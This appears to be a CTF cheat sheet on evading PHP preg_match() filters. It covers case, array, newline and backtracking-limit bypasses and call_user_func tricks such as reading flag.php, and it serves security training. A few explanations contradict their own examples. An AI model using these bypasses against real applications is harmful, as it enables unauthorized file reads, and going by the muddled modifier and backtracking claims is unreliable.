# PHP Regex Bypass Quick Reference

## Core Principles

When PHP's `preg_match()` function filters user input, it is often bypassed due to poorly designed regular expressions.
Understanding regex modifiers and PHP type behavior is key to the bypass.

## 1. Case Bypass

**Applicable condition**: The regex lacks the `i` (PCRE_CASELESS) modifier

```php
// Filtered regex — no i modifier
preg_match("/n|c/m", $_GET['p']);  // Only matches lowercase n and c

// Bypass method — use uppercase letters
// nss2 contains n → blocked
// Nss2 contains N → does not match lowercase n → bypass succeeds!
// Ctf contains C → does not match lowercase c → bypass succeeds!

// PHP class names and function names are case-insensitive
call_user_func('Nss2::Ctf');  // Equivalent to nss2::ctf()
```

**Verification method**: First confirm whether the regex has the `i` modifier, then decide whether to use a case bypass

## 2. Array Bypass

**Applicable condition**: The function only accepts a string argument; passing an array returns false

```php
// preg_match()'s second argument requires a string
// Passing an array → returns false + Warning → bypasses the regex check

// URL: ?p[]=nss2&p[]=ctf
// $_GET['p'] = ['nss2', 'ctf']  (array rather than string)
// preg_match("/n|c/m", ['nss2', 'ctf']) → false → bypass!

// call_user_func accepts an array as a callback
call_user_func(['nss2', 'ctf']);  // Equivalent to nss2::ctf()
```

## 3. Newline Bypass

**Applicable condition**: The regex uses `^...$` anchors + the `m` modifier

```php
// Common misconception: the m modifier does not make /n/ match a newline
// The m modifier only affects the matching behavior of ^ and $ (multiline mode)

// Bypassable case:
preg_match("/^flag$/", $input);  // Under the m modifier, %0aflag can be used to bypass

// Non-bypassable case:
preg_match("/n|c/m", $input);    // m does not affect matching of n and c
```

## 4. PCRE Backtracking Limit Bypass

**Applicable condition**: An extremely long string + a regex with heavy backtracking

```php
// preg_match's default backtracking limit is 1000000
// Exceeding it returns false (not 0 or 1)

// Construct an extremely long string to trigger the backtracking limit
$str = str_repeat('a', 1000000);
preg_match("/.*$/", $str);  // Returns false → bypass
```

## 5. `%0a` Newline Injection

**Applicable condition**: The regex uses `^...$` but lacks the `s` (DOTALL) modifier

```php
// Bypass the ^...$ anchors
// Input: "good\nmalicious"
preg_match("/^good$/", "good\nmalicious");  // Does not match without m
preg_match("/^good$/m", "good\nmalicious");  // Matches the first line with m
```

## Common CTF Challenge Patterns

| Type | Regex Example | Bypass Method |
|------|----------|----------|
| Case filter | `/n\|c/m` | `Nss2::Ctf` (case bypass) |
| String function filter | `/system\|exec/` | `p[]=class&p[]=method` (array bypass) |
| Anchor matching | `/^flag$/` | `flag%0a` or `%0aflag` (newline bypass) |
| Backtracking limit | `/.*/` | Extremely long string triggers PCRE backtracking limit |
| No anchors | `/flag/` | `flflagag` (double-write bypass, if str_replace is used) |

## call_user_func Callback Quick Reference

```php
// Call a regular function
call_user_func('readfile', 'flag.php');

// Call a static method (string form)
call_user_func('Nss2::Ctf');  // After case bypass

// Call a static method (array form)
call_user_func(['Nss2', 'Ctf']);  // After array bypass

// Call an instance method
call_user_func([$obj, 'method']);
```

## ⚠️ Common Mistakes

1. **`call_user_func('readfile')` without an argument** — will not read any file; you must pass `call_user_func('readfile', 'flag.php')`
2. **Confusing the `m` and `i` modifiers** — `m` is multiline mode; `i` is the one that ignores case
3. **Ignoring PHP type juggling** — `preg_match` returns `false`, not `0`, when given an array
4. **Guessing the flag content** — you must obtain the real response through tools; do not fabricate it
